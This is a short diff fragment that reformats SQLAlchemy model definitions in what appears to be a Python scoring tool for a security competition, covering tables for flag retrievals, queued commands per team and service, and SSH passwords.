     service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
-    service = db.relationship(Service, backref=db.backref("flag_retrievals", cascade="all, delete-orphan"))
+    service = db.relationship(
+        Service, backref=db.backref("flag_retrievals", cascade="all, delete-orphan")
+    )
     root_shell = db.Column(db.Boolean, nullable=False)
     command = db.Column(db.Text, nullable=False)
 
@@ -1314,9 +1495,13 @@ class FlagRetrieval(db.Model):
 class QueuedCommand(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
-    team = db.relationship(Team, backref=db.backref("queued_commands", cascade="all, delete-orphan"))
+    team = db.relationship(
+        Team, backref=db.backref("queued_commands", cascade="all, delete-orphan")
+    )
     service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
-    service = db.relationship(Service, backref=db.backref("queued_commands", cascade="all, delete-orphan"))
+    service = db.relationship(
+        Service, backref=db.backref("queued_commands", cascade="all, delete-orphan")
+    )
     root_shell = db.Column(db.Boolean, nullable=False)
     command = db.Column(db.Text, nullable=False)
 
@@ -1340,8 +1525,6 @@ class SSHPassword(db.Model):
     def __init__(self, password):
         self.password = password
 
-
-# </editor-fold>
 
 if __name__ == "__main__":
     main()
